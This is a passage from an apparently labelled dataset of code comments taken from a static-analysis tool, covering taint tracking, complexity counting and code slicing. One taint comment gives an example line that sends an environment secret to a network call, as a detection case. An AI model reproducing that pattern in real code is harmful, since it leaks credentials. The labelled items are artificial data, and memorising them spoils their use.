    "text": "INV-loguk slice C (batch 4, common-package programming languages). Node-type\nnames verified by dumping each real grammar (see each owning analyzer's\npackage tests).\nFortran: `elseif_clause` carries its own condition (counted); `else_clause`\nexcluded. BOTH the counting `do` loop and the `do while` loop parse to\n`do_loop_statement` (count that, NOT the do-while's inner `while_statement`\nchild, which would double-count). `case_statement` = each select-case arm\nincl. `case default`. `.and.`/`.or.` short-circuit via logical_expression."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/linkers/containment.py",
    "text": "ADR-0027 Phase-2 audit (WI-jukav slice 2 verdict): no dual-shape\npredicate needed. The post-fold canonical for Cluster D ``rpc`` is\n``method`` + ``meta[\"framework_role\"]=\"rpc\"`` — and ``method`` is\nalready in this set, so post-fold producers match unchanged.\nCluster H pending ``message`` resolves in Wave 6 and similarly\ncannot fold without changing this set. None of the live schema\nproducers emits the legacy ``rpc`` / ``service`` kinds: proto.py\nemits ``method`` with ``framework_role=\"rpc\"`` under an ``interface``\nwith ``framework_role=\"service\"``, thrift.py emits ``function``\nmembers of such an ``interface``, and capnp.py emits plain\n``interface`` / ``method`` with no role. They pass the kind through\npositional helpers that the L3 producer-coherence linter cannot\nstatically gate; the Wave-5\nframework-linker producers don't reach this filter (their"
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/linkers/containment.py",
    "text": "WI-fokag: ``subscript`` (Swift subscript members, emitted with dotted names\nlike ``JSON.subscript(key:)`` — the parenthesized ``(key:)`` suffix carries\nno name separator, so parent-name extraction already yields ``JSON``) roots\nat its enclosing type exactly like ``method``. Without it, correctly-named\nstruct-body subscripts had 0 ``contains`` edges (verified on SwiftyJSON\npost-#689: the JSON struct contained its field/method members but not its\nsubscripts, leaving the flagship ``json[...]`` accessors looking like\norphaned members of the central type). Like ``field`` above, this is a\ngraph-completeness fix — the dead-code BFS does not traverse ``contains``,\nso it does not move the dead-code-maybe FP rate. (The separate gap where a\n``json[\"key\"]`` subscript-CALL site does not resolve to the subscript node\nis a Swift-analyzer resolution facet, out of scope here.)\n"
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/pass_silence.py",
    "text": "---------------------------------------------------------------------------\nWHAT ACTUALLY DECIDES THE HOST (WI-mamiv, measured 2026-09-17)\n\nThe section below frames the split as \"did the pass run?\". That is the\nINTENT; it is not what the code does, and the difference is measurable.\n\nOn component-model-demo, 162 passes: 130 of them carry `no_candidate_files`\n-- 48 through `AnalysisRun.silence_reason` and 82 through\n`limits.skipped_passes[].silence_reason`. The SAME value, for the SAME\nfact (zero files of that language in this tree), on two different fields.\nThree routes get you there, and none is a property of the silence:\n\nroute                                      discriminator                n\npre-filter short-circuit                   every declared language is    75  -> skipped_passes\nin taxonomy.LANGUAGE_EXTENSIONS\ndispatched, returns bare AnalysisResult()  the analyzer's return style    7  -> skipped_passes\ndispatched, returns run w/ files_analyzed=0  the analyzer's return style 26  -> analysis_runs\n\nMeasured cleanly: 0 in-taxonomy analyzers report on the AnalysisRun host\nand 75 on the skip host; 26 out-of-taxonomy report on the AnalysisRun host\nand 7 on the skip host. `apex`, `twig` and `make`\ngo one way; `java`, `matlab` and `scss` go the other, for the identical fact.\n\nSo the host encodes PRODUCER REGISTRATION AND IMPLEMENTATION DETAIL. A\nconsumer that reads one field and not the other gets a number that depends\non the taxonomy table, and the two stderr summaries report `64 of 79` and\n`83 of 162` -- different denominators over overlapping populations, whose\nsum is not the answer either.\n\nThe cure is :func:`census_silence`, which unions the two and is what a\nconsumer asking \"which passes had no input?\" should call. Whether the\nROUTING should change -- so the host becomes a function of the fact -- is\nopen on WI-mamiv and is not settled here, because it touches the WI-didil\nAR-or-skip completeness contract.\n\nNOTE the value split is NOT symmetric with the host split. Three values\n(`dependency_unavailable`, `backend_disabled`, `pass_crashed`) appear only on\nskipped_passes and three (`no_candidate_construct`, `candidates_unresolved`,\n`prerequisite_absent`) only on AnalysisRun; the overlap is exactly\n`no_candidate_files` and `unreported`, and it is the overlap that carries\n80% of the volume.\n---------------------------------------------------------------------------"
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/pass_silence.py",
    "text": "\n**Instances are now observed (WI-dabup).** This used to read \"no instance\nhas been observed\", and that was true only of an environment where every\ngrammar is installed. In a venv without ``tree-sitter-rust``, surveying a\nJS+Rust repository, ``tauri-ipc-linker`` and ``rust-trait-dispatch-linker``\nare silent while Rust files sit in the tree — and before this value had a\nproducer they claimed :data:`NO_CANDIDATE_FILES`, which is declared to mean\n\"nothing to find, and no ordering or declaration mechanism would change it\".\nInstalling the grammar changes it. The axis was asserting something false,\nwhich is worse than abstaining, and is why the producer was built rather"
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/linkers/method_call_recovery.py",
    "text": "java's variable-receiver calls reach this linker at all:\n\nfloat d = audio.getSamples().length / (float) audio.getSampleRate();\n\n``audio`` is a ``GeneratedAudio``, the enclosing ``main`` also\ninstantiates ``OfflineTts``, SIX classes in that repository\ndeclare ``getSampleRate``, and the line-proximity tiebreaker below\nchose ``OfflineTts`` -- nine times, in nine example files. The\nedge carried ``receiver_type_hint=\"GeneratedAudio\"`` throughout."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/linkers/method_call_recovery.py",
    "text": "languages and JS/TS as the ``instantiates`` one. That was stale in both\ndirections — java.py and py.py both emit ``instantiates`` today, and ruby is\nthe language that actually never does (WI-toruz)."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "WI-joluk. The DDG facts closed, but they are not the whole picture:\nthe caller has evidence that the CFG recorded no statement covering\nsome call node in this function's body, so the def/use extractor\ndemonstrably did not see part of it. An exhausted walk over an\nincomplete graph is not the same fact as an exhausted walk, and\n``False`` is the only verdict that may license removing a reported\nflow.\n\nWHY THIS IS COVERAGE-GATED AND NOT GAP-ENUMERATED. The population is\nwhatever a language's def/use extractor does not model, which is not\nknowable from inside this walk — it cannot tell a construct nobody\ntaught it about from one that genuinely has no uses. A fix shaped as\n\"handle the known gaps\" is a list that decays silently, and it\ndecays in the direction that deletes findings.\n\nBlocks ``False`` ONLY. A ``True`` above is positive evidence of a\ndependence the walk actually found, and an incomplete picture cannot\nunmake it — downgrading that would turn a safety gate into a recall\nregression."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "Defensive. Both conditions are already enforced at every enqueue\nsite — barrier seeds skip `reachable`, and neighbours are\nenqueued only when absent from `reachable`, `sanitized_reachable`\nAND `sanitized_parent` — so nothing can be queued twice today.\nKept because the alternative to a redundant guard here is an\ninfinite loop if a future edit relaxes one of those enqueue\nconditions."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/io_boundary.py",
    "text": "A mode string means \"can write\" if any of these appear in it. ``+`` is\nincluded deliberately: ``r+`` opens for update, and a security claim about\nfilesystem writes cares that the handle CAN write, not that the caller\nhappened to describe it as a read."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/io_boundary.py",
    "text": "A SINGLE-BOUNDARY PRIMITIVE IS NEVER \"SIMULTANEOUS\" — there is nothing\nfor it to be simultaneous WITH. This is not defensive padding: the\nflag is spelled per ROW, and a row legitimately groups methods that\ndiffer in this respect. objc's ``net_send`` row lists the two\n``NSURLConnection`` request methods (genuinely both send AND receive)\nalongside ``connectionWithRequest:delegate:``, which the ``net_recv``\nrow does not carry. Demanding surgical row splits to express that\nwould put the burden on every catalogue author and invite exactly the\nhalf-declared pairs the check above rejects. Returning empty here\nmeans such a method simply gets its one chain, as before."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/verify_claims.py",
    "text": "SHORTENING IS BOUNDED BY ITS OWN PURPOSE (INV-lakom). It exists to strip\na trailing TYPE name off a callee slot -- ``app.config.Loader`` for a\ncallee defined in ``app/config.py`` -- and that is ONE component. It was\nunbounded, walking every prefix down to a single component, so it equally\nlicensed ``os.path`` -> ``os`` and ``crypto.tls`` -> ``crypto``. Measured:\na repo owning ``myapp/os/helpers.py`` and calling ``os.path.join``\nreported coverage COMPLETE over the standard library ``os`` -- a clean\nverdict over a module nothing examined, produced by a directory-name\ncollision.\n\nTWO BOUNDS, EACH FOR ITS OWN REASON.\nONE STEP, because that is the length of a type name. A nested class\n(``app.config.Loader.Inner``) would need two and is NOT licensed;\nit reports a gap, which is the safe direction.\nNEVER TO A SINGLE COMPONENT, because a bare ``os`` / ``crypto`` /\n``json`` / ``time`` is precisely the spelling that collides with an\nordinary directory name -- and the analyzed set is matched as a\ncomponent-bounded INFIX (it has to be, to tolerate packaging\nprefixes), which makes a one-component needle match almost anywhere.\n\nNOT \"match the shortened form as a SUFFIX instead\", which was the first\ndesign and is refuted by INV-liloh's own fixture: the src-layout callee\n``hypergumbo_core.scip._generated`` shortens to ``hypergumbo_core.scip``,\nwhich sits INSIDE\n``packages.hypergumbo-core.src.hypergumbo_core.scip.loader`` and is not a\nsuffix of it. A suffix rule would have re-broken that."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/verify_claims.py",
    "text": "INV-fibis. Read ONCE, here, and consumed only on the clean paths below. A\n``violated`` verdict must not acquire it: finding evidence is trustworthy\nregardless of what else went unadjudicated, and the whole discipline of\nthis module is that coverage gates the ALL-CLEAR and nothing else.\n\nSCOPED BY THE CLAIM'S OWN BOUNDARY, which is what keeps an unrelated dict\n``.get`` out of a ``net_send`` verdict — the mis-fire the 2026-08-11\nmeasurement caught, and the reason the unscoped DOWNGRADE was refused."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/compact.py",
    "text": "WI-nivuj: a SET's iteration order is PYTHONHASHSEED-dependent, so a set\nis sorted to keep the seed prefix reproducible. A SEQUENCE is taken in the\ncaller's order — that is the interleaved policy's fixed, budget-independent\nseed order (WI-zulij), and sorting it would destroy exactly the property it\nis there to provide."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/linkers/type_hierarchy.py",
    "text": "WI-digaj: languages where a ``static`` member is bound at compile time, so a\nsame-named static in a subclass hides rather than overrides. Not universal:\nPHP's ``static::`` late static binding, JavaScript statics reached through\n``this`` and Python classmethods all dispatch to the subclass, so the guard\nis per language. It reads the method's recorded modifiers, so it is exact\nwhere the producer records ``static`` (C#, Java) and inert where it does not\n(C++ member functions record none yet)."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/all_analyzers.py",
    "text": "NOT fail-open: a catalogue file that does not parse -- a\nuser's library_signatures.d or dataflow_patterns.d file --\nwould fail the same way for every run, and recording it as\none crashed pass emitted a map with the whole language\nmissing and exit 0. Re-raised so the CLI reports the file\nwith exit 2, like a broken file read outside the pool."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/spec_validator.py",
    "text": "Top 3 largest collision groups, by member count. Secondary key\non the stable_id breaks size ties deterministically so the\nrendered message is byte-stable across symbol-iteration orders\n(ADR-0043 §6); a bare reverse-by-length leaks insertion order."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/slice.py",
    "text": "WI-hukoh Phase A: per-rule admission counters for dataflow BFS. Empty\nunless dataflow mode is active. See SliceResult.admission_stats docstring\nfor key semantics. These counts are incremented at the dataflow decision\npoint only — downstream filters (confidence, tier, hub threshold, file\nlimit) may still reject edges that were admitted here, so the admission\ntotals are an upper bound on what actually lands in the slice."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/entrypoints.py",
    "text": "The entrypoint kinds whose handler RECEIVES AN EXTERNAL REQUEST: an HTTP\nroute, a controller action, a WebSocket handler, middleware, a GraphQL\nserver. A framework hands that request to the handler as a parameter or a\nframework global, not through a call the catalogue can match, so it is\nnever a taint source by itself (WI-ritog); ``verify_claims`` withholds a\nclean ``untrusted_input`` / ``net_recv`` verdict while such a handler exists\n(WI-fuzik, ADR-0049 ruling 3). Kinds that run on a schedule, a CLI, an\nin-process event or a test receive no request and are left out."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/linkers/websocket.py",
    "text": "Pattern types that use \"message\" as a synthetic placeholder for\ngeneric protocol operations (ws.send(), websocket.receive_text(), etc.)\nrather than a real named event.  Linking these across files creates\nNxM combinatorial explosion without meaningful semantic signal."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/paths.py",
    "text": "A ``Test`` PREFIX is deliberately not matched: ``TestConfig.java`` is as\noften test support or production config (test_sketch pins it)."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/scip/index.py",
    "text": "The abstract-type family is mapped WHOLE. SCIP declares Protocol\nbeside Trait and Interface, and omitting it meant a Swift or\nObjective-C protocol indexed by SCIP never reached the `protocol`\nkind at all -- the partial-family enumeration that\ntest_no_language_agnostic_module_hand_rolls_a_partial_abstract_family\nexists to catch, and the reason it was catching this file."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
    "text": "LLVM IR: count only unambiguous multi-way / exceptional / select\ninstructions. `instruction_br` is DELIBERATELY EXCLUDED — the grammar uses\none node type for BOTH conditional and unconditional branch (differ only by\nchild count, which the walker can't inspect), and unconditional br is\nubiquitous. icmp/fcmp are values, not branches (excluded). Conservative\nundercount of true branching; CC stays non-null."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
    "text": "The ``is_named`` guard is essential: several grammars (notably\ntree-sitter-ruby and tree-sitter-nim) emit BOTH a named construct\nnode AND an anonymous keyword token sharing the same ``.type`` string\n(e.g. a named ``if`` expression node and the bare ``if`` keyword token\nare both ``.type == \"if\"``). Decision points are always *named*\nconstruct/clause nodes, so requiring ``is_named`` counts each branch\nexactly once and prevents the keyword-token double-count. (This is why\n``BRANCH_NODE_TYPES[\"ruby\"]`` can safely list ``if``/``while``/etc.)"
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/linkers/containment.py",
    "text": "A qualified name's prefix may be a NAMESPACE that shares its name\nwith a class (C# ``namespace Demo;`` beside a ``class Demo``): the\nowner must sit in the child's own file (a nested declaration is\ndeclared inside its owner; C#'s partial class re-declares it there)\nand its own qualified name, if it has one, must BE the prefix (that\nclass's is ``Demo.Demo``)."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/pass_silence.py",
    "text": "ACCOUNTED-FOR is a different question from HAS-A-SILENCE-REASON, and\nconflating them is the same mistake this module exists to stop: a pass\nthat EMITTED has an analysis_runs row and no silence reason, and it is\nfully accounted for. Tracking presence separately is what keeps a\nproductive pass out of `unaccounted`."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/linkers/method_call_recovery.py",
    "text": "WI-fihun: TYPE NAMES WHOSE INSTANCES ARE NOT CALLABLE. The class objects are\n(``int()`` builds an int), but a member DECLARED as one holds an instance, and\ncalling an instance of any of these is a TypeError. Deliberately the builtin\nscalars and containers only: this list is read as PERMISSION TO REFUSE, so\nanything not on it must leave the candidate standing."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/slice.py",
    "text": "INV-rakot: echo the confidence threshold so the slice is\nreproducible from its JSON. Omitted at the 0.0 default (no\nfiltering, so it did not influence the slice) — consistent with\nthe other conditional echoes and stable for the feature_id hash."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/slice.py",
    "text": "Try module:name shorthand (WI-hogun). Pattern: <ident>:<ident> —\nresolve to any symbol whose name equals the right side AND whose\nfile's basename (sans extension) equals the left side. Lets callers\nsay `cli:main` instead of hunting for `packages/hg/src/hg/cli.py`.\nIdentifier parts only — a slash on either side falls through."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/slice.py",
    "text": "Add import edges from this file (forward only, unless imports\nexcluded) -- INV-tarol: ONLY when the entry is a container/file\nkind. A function-entry slice must not absorb its containing file's\nimports: those edges (src=file-node) are not reachable from the\nfunction, pollute the slice with above-scope content, and break\nsubgraph closure (the file-node is not in the slice's node set)."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/slice.py",
    "text": "Class expansion: when entry nodes include container types (class,\ninterface, etc.), auto-expand to include member methods as additional\nstarting points. For reverse slices, this finds callers of member\nmethods (e.g., --reverse --entry OwnerRepository finds callers of\nfindById, search, etc.). For forward slices, this is needed because\n'contains' edges are excluded from forward BFS traversal, so without\nexpansion the class entry would not reach its own methods."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/slice.py",
    "text": "WI-mibuj: what each limit STOPPED, so a truncated slice can say how\nmuch is missing instead of only that something is. limit -> ids of\nthe edges it refused (with the edge itself, for the pass-through\ncheck) and of the nodes it kept out; hop_limit / hub_pruned also\nrecord the slice nodes they refused to expand."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/slice.py",
    "text": "Hub node pruning: skip traversal for high-degree nodes.\nEntry nodes and their immediate neighbors (depth ≤ 1) are exempt.\nThis prevents the common \"main → run()\" pattern from producing\nnearly-empty slices when run() is a large orchestrator function.\ndispatches_to edges are exempt from the count: they represent\nintentional architectural fan-out (registry dispatch), not noisy\nutility calls. Without this exemption, dispatch sites like\nrun_all_analyzers (100+ handlers) get hub-pruned and the slice\nmisses all registered handlers."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/pass_silence.py",
    "text": "Files were read and none contained the construct this pass looks for.\nState A one level down: a GraphQL resolver linker scanning a repository\nwith no GraphQL resolvers correctly emits nothing, having opened the files\nto find that out. Only a pass BODY may report this."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/pass_silence.py",
    "text": "The pass FOUND its construct and carried none of it through resolution.\nState A's near neighbour and its opposite in consequence: an import whose\nexport is missing, a DI binding resolving to no symbol, a write with no\nmatching read. :data:`NO_CANDIDATE_CONSTRUCT` says the construct is not\nthere; this says it is there and the pass could not relate it to anything.\nA consumer asking \"is this pass useful on my repository?\" needs them\nseparated: \"you have no GraphQL resolvers\" and \"you have GraphQL resolvers\nwe could not connect to a schema\" are opposite answers.\n\nWHAT IT DOES NOT CLAIM: why resolution failed. The counterpart may be\ngenuinely absent (a correct no-op) or the pass's own matcher may have missed\nit (a recall defect), and a pass cannot tell those apart from the inside --\nthey need opposite responses, which is why this value names the pass's own\nstage rather than the repository's contents. Only a pass BODY may report it."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/pass_silence.py",
    "text": "The three states the axis exists to separate (see the module docstring).\nA reason names the states it is CONSISTENT WITH, not one state, because the\nvalue is all a reader holds and several values cannot tell two states apart\non their own: :data:`DEPENDENCY_UNAVAILABLE` is State C when the pass had\nfiles to read and State A when it had none (installing the grammar would\nchange nothing), and a skip record does not say which."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/pass_silence.py",
    "text": "The vocabulary's names. Computed-not-derived (like ``visibility``), exposed\nvia :func:`all_pass_silence_reason_names` and wired into\n``multi_value_field_axis._known_axes`` so the\n``# axis: pass-silence-reason`` field annotation resolves like every other."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "True for a row from a file declaring ``provenance: community``: a\ncommunity taint file, or the community io_primitives overlay the row\nwas derived from (ADR-0061). Read as :attr:`unvouched` by the shared\nrow choice (INV-tobur). Stamped at load, never read from the YAML."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "WI-jusoj (a): the sink is called ON the source's line, so it can CONTAIN the\nsource as an argument (``requests.post(url, headers={\"A\": os.environ[\"K\"]})``)\nand no line-ordered walk can adjudicate it. NOT ``sink_before_source``,\nwhose rows INV-muhij keeps from carrying a verdict alone: a same-line row\nkeeps carrying it, because \"the sink is not after the source\" was never\nevidence that the source's value does not reach it."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "INV-hopib: for a sink that is a stream OBJECT (an attribute row), the\ncalls it was written through, as ``<callee>@<line>`` -- ``json.dump@9``\nfor ``json.dump(secret, sys.stdout)``. The stream has no arguments of its\nown, so without these the record names a sink a reader cannot check the\nvalue against. Empty for a call sink, and for a stream every use of which\nwas outside a call. A stream carried ONLY by calls that are themselves\nsinks in the same zone is not a finding at all (``_subsume_sink_sites``)."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "INV-komoj: the functions whose RETURN VALUE carried the source's value\nto ``source_symbol``, sorted. Empty when ``source_symbol`` reads the\nsource itself. Non-empty means ``source_symbol`` CALLS one of these and\nthe value came back out of the call -- :func:`_lift_returned_sources`\nmade that call site a source -- so a reader looking for the read of\n``source_primitives`` in ``source_symbol``'s body will not find it there.\nA set, not a route: a collapsed row unions its members' sets, and one\nchain's order would claim a single route the group does not have."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "INV-muhij: ``not`` rather than ``is None`` would be wrong here in a\nway it is not above — ``(\"\",)`` is a legitimate derived value and\nmust not be re-derived on every construction, but ``()`` is the\n\"caller did not set it\" default. ``len(...) == 0`` says exactly that."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "``replace`` rather than in-place assignment: this is a public\nfunction and mutating findings the caller still holds is a side\neffect the signature does not announce. ``__post_init__`` re-runs\nand leaves the explicit tuples alone (it only fills EMPTY ones)."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "Mode gate for DUAL-CLASSIFIED primitives, applied before every other\narm so both the resolved and unresolved paths inherit it rather than\ngrowing a second copy. Only entries that opted in via ``requires_mode_boundary``\nare affected; an entry without it is unconditional and untouched, which\nis what keeps ``os.remove`` firing on a call that carries no mode.\n``getattr`` for BOTH reads, not just the guard: the index is typed\n``TaintSource | TaintSink`` and only sinks carry ``requires_mode_boundary``, so\na direct attribute read is a strict-mode union-attr error."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "INV-vukiv: EVERY collapsed site's mode, not the first one's. A function\nthat opens a path 'r' at one line and 'w' at another arrives here as one\nedge, and asking only the survivor's singular ``io_mode`` dropped the\n``fs_write``-gated sink on the strength of a different call site — the\nsame false-negative shape ``call_arg_shape``'s conservative merge exists\nto prevent, one key over."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "The community layer ONLY ADDS: an entry whose (module, name, kind) a\nbuilt-in or auto-derived entry already holds is dropped, never the\nother way round, and nothing it drops is a displacement worth\ndisclosing -- the vouched row stayed."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "One return statement as ``ddg_build.ReturnStatement`` records it:\n``(start_line, end_line, identifiers per result position)``, with every\nname token per result position as a fourth member where recorded\n(:func:`_span_names`; WI-kikar)."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "BUCKET UNDER THE LANGUAGE REQUESTED, NOT ``catalog.language``. For an\nalias those differ — ``load_catalog(\"typescript\").language`` is\n``\"javascript\"``, because the field comes from the YAML that was\nactually read — so bucketing by the catalogue's own name is what fed\ntypescript's rows to javascript and left typescript empty.\n\nThe boundary arm already does exactly this, and has since the alias\nwas introduced: ``cli.py`` keys ``catalogs`` under both names with a\ncomment naming these same two aliases. This is that symmetry\nrestored on the taint arm, not a new policy."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "A LIST, NOT A SLOT (INV-pojib). This used to assign, so the LAST\nshort-name match won: all four shipped ``*.encrypt`` sanitizers\nmatch a bare ``encrypt`` callee, and a fixture calling\n``Fernet.encrypt`` was attributed to\n``ChaCha20Poly1305.encrypt``. The barrier never noticed because it\nonly asks WHETHER some sanitizer carries this label; attribution\nasks WHICH, and the honest answer is \"one of these\"."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "Bridge edges no longer enumerated explicitly: post-Phase-3\n(WI-mifor-vabul), every bridge folds to 'calls' which is already a\nmember; meta['bridge_kind'] carries the bridge type. Protocol-call\nfamily (WI-vumum-juvil) similarly folds into 'calls' + meta['protocol'],\nso HTTP/gRPC/GraphQL call taint propagation transfers automatically.\nimplements_rpc folded to 'implements' + meta['protocol']='grpc'\n(audit-findings 0016) — NOT a plain set member (that would wholesale-\ninclude every structural 'implements' edge); matched by the\nis_grpc_rpc_implementation predicate via _is_taint_call_edge below.\n\nINV-zuhig: framework-dispatch edges are call-shaped for taint. The\nFramework linkers (go_cobra, argparse_dispatch, decorator/django/\njackson/kafka/caddy/airflow/rust-trait dispatch) emit\n``dispatches_to`` for \"runtime dispatch will invoke dst with data\nsrc controls\". Excluding the family made every framework-dispatched\nhandler unmintable as a start_at:callee source — the self-proof's\ncmd_* handlers were reachable only through argparse dispatch, so\nsources minted ZERO flows and all 18 confirms were vacuous on the\ntaint side. Membership grows adjacency and minting monotonically;\nthe one non-additive surface (sanitizer registration over dispatch\nedges) shares the same predicate deliberately, so a dispatched-to\nbarrier function still registers — one rule, one home."
   },
   {
    "label": 1,
+   "kind": "comment",
    "origin": "hypergumbo_core/taint.py",
    "text": "io_primitives boundary -> taint_label for auto-derived source\n\nA BOUNDARY THAT AUTO-DERIVES A LABEL MUST MEAN WHAT THE LABEL MEANS\n(INV-tutar). ``env_read`` used to carry BOTH readings and this map read\nthe wrong one: 134 of the 195 shipped ``env_read`` rows were host\nDESCRIPTION (``runtime.GOOS``, ``os.uname``, ``navigator.platform``,\n``platform.system``) or user identity (``os.getlogin``, ``pwd.getpwnam``),\nand calling those a *secret* is why ``host-secret-*`` claims carried 48 of\n85 adjudicated flows at 22.9% precision -- the weakest family in\nmeasurement 0001. The catalogue was already distorting itself to cope:\n``python.yaml`` deliberately withheld ``getpid`` / ``cpu_count`` because\nrowing them here \"would manufacture false sources\", while ``go.yaml``\nrowed ``GOOS`` and ``Getwd`` -- one boundary value, two membership rules,\ntwo shipped files.\n\nTHE SPLIT IS OF THE BOUNDARY, NOT THE LABEL, and not a per-row override.\nThe boundary vocabulary is the registry-backed thing\n(``CATALOG_BOUNDARY_TYPES``); a per-row ``taint_label`` would let the row\nand the boundary each decide, which is one fact in two homes."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
    "text": "Ruby: count per-arm, not the switch wrapper, matching the arms-only\nconvention used by every other language (c ``case_statement`` / java\n``switch_label`` / go ``expression_case``). ``when`` = each case/when arm;\n``in_clause`` = each case/in pattern-match arm (Ruby 3). The ``case`` /\n``case_match`` wrapper nodes are deliberately NOT counted (they would add\na spurious +1 per switch). ``if``/``while``/``for``/etc. are single-\ncondition constructs counted once. The ``is_named`` guard in\n:func:`compute_cyclomatic_complexity` is essential here: tree-sitter-ruby\nemits a named construct node AND a same-``.type`` anonymous keyword token\nfor each of these, and only the named one is a decision point."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
    "text": "OCaml is expression-oriented: control flow ends in _expression. `match_case`\n= one per match arm AND per try/with handler arm (try_expression's handlers\nare match_case nodes, so they count automatically — do NOT add\ntry_expression). `else_clause` is the alternative path (excluded); else-if\nis a nested `if_expression` (counted). &&/|| are named and_operator/\nor_operator children, unreachable by the unnamed scan — absent."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
    "text": "Erlang: `cr_clause` = case AND receive arms (same node type); `if_clause` =\neach if guard-arm; `receive_after` = the receive ``after`` timeout branch.\n`function_clause` is NOT counted (the first clause is the base entry path;\nadditional clauses are aggregated by the analyzer's coalescing wiring).\n`guard_clause` is NOT counted (it qualifies an already-counted arm).\nandalso/orelse ARE counted (short-circuiting) via SHORT_CIRCUIT_OPS plus\nthe `binary_op_expr` member added to _BINARY_EXPR_NODE_TYPES below; the\nnon-short-circuiting `and`/`or` are excluded."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
    "text": "Dart: `else` is a bare keyword (else-if = nested `if_statement`, counted).\nSwitch arms are `switch_statement_case` / `switch_statement_default` (both\ncounted, incl. default). do-while = `do_statement`; ternary =\n`conditional_expression`; try/catch = `catch_clause`. Dart has no\n`binary_expression`; short-circuit &&/|| are dedicated\n`logical_and_expression` / `logical_or_expression` nodes (one per\noperator), counted as branch nodes rather than via the operator scan."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
    "text": "Perl: if/unless => `conditional_statement`; while/until => `loop_statement`;\nfor/foreach => `for_statement`; ternary => `conditional_expression`; the\nstatement-modifier forms are `postfix_conditional_expression` /\n`postfix_loop_expression`. `elsif` is DELIBERATELY excluded — the grammar\ngives the named elsif wrapper AND the bare elsif keyword token the same\n`.type`, so counting it would double-count (same collision class as\nhaskell `case`); an if/elsif chain conservatively counts as 1.\n&&/||/// are short-circuit (unnamed children of binary_expression); the\nword-forms and/or live in a different node and are not counted."
   },
   {
    "label": 0,
+   "kind": "comment",
    "origin": "hypergumbo_core/analyze/cyclomatic.py",
